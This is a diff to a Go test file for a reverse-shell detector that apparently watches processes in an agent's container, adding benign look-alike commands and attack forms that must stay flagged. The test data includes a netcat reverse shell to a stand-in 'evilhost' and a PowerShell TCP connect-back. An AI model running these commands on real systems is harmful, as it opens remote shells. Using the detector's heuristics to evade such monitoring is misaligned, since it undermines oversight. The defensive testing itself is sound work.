@@ -73,7 +73,7 @@ func TestDetectReverseShells(t *testing.T) {
 		},
 
 		// True positives must survive the tightened heuristic: real reverse
-		// shells all carry a socket/tcp/udp/connect keyword, an IP, or a
+		// shells all carry a socket/tcp/udp keyword, an IP, or a
 		// host:port endpoint.
 		{
 			name: "python reverse shell with socket+IP",
@@ -117,6 +117,65 @@ func TestDetectReverseShells(t *testing.T) {
 			name: "interactive bash shell flagged regardless of network indicator",
 			processes: []Process{
 				{PID: 1234, User: "1000", Command: `bash -i`},
+			},
+			wantCount: 1,
+		},
+		// Benign agent commands that only mention a tool name or contain a
+		// pattern glued inside another word. Each was a CRITICAL match, which
+		// auto-kills the container under the default auto_kill_on_critical.
+		{
+			name: "installing or locating socat is not a reverse shell",
+			processes: []Process{
+				{PID: 1, User: "1000", Command: `sudo apt-get install -y socat`},
+				{PID: 2, User: "1000", Command: `which socat`},
+			},
+			wantCount: 0,
+		},
+		{
+			name: "searching for powershell is not a reverse shell",
+			processes: []Process{
+				{PID: 1, User: "1000", Command: `rg -i powershell docs/`},
+			},
+			wantCount: 0,
+		},
+		{
+			name: "rsync -e does not match nc -e",
+			processes: []Process{
+				{PID: 1, User: "1000", Command: `rsync -e ssh ./a ./b`},
+			},
+			wantCount: 0,
+		},
+		{
+			name: "ssh -i does not match sh -i",
+			processes: []Process{
+				{PID: 1, User: "1000", Command: `ssh -i /home/code/.ssh/deploy_key git@github.com`},
+			},
+			wantCount: 0,
+		},
+		// The real attack forms of those patterns stay detected.
+		{
+			name: "netcat and sh by absolute path stay detected",
+			processes: []Process{
+				{PID: 1, User: "1000", Command: `/usr/bin/nc -e /bin/sh evilhost 4444`},
+				{PID: 2, User: "1000", Command: `/bin/sh -i`},
+			},
+			wantCount: 2,
+		},
+		{
+			name: "other interactive shells keep matching after token anchoring",
+			processes: []Process{
+				{PID: 1, User: "1000", Command: `zsh -i`},
+				{PID: 2, User: "1000", Command: `/bin/dash -i`},
+				{PID: 3, User: "1000", Command: `ksh -i`},
+				{PID: 4, User: "1000", Command: `/bin/ash -i`},
+				{PID: 5, User: "1000", Command: `fish -i`},
+			},
+			wantCount: 5,
+		},
+		{
+			name: "powershell TCP reverse shell stays detected",
+			processes: []Process{
+				{PID: 1, User: "1000", Command: `powershell -nop -c $c=New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444)`},
 			},
 			wantCount: 1,
 		},
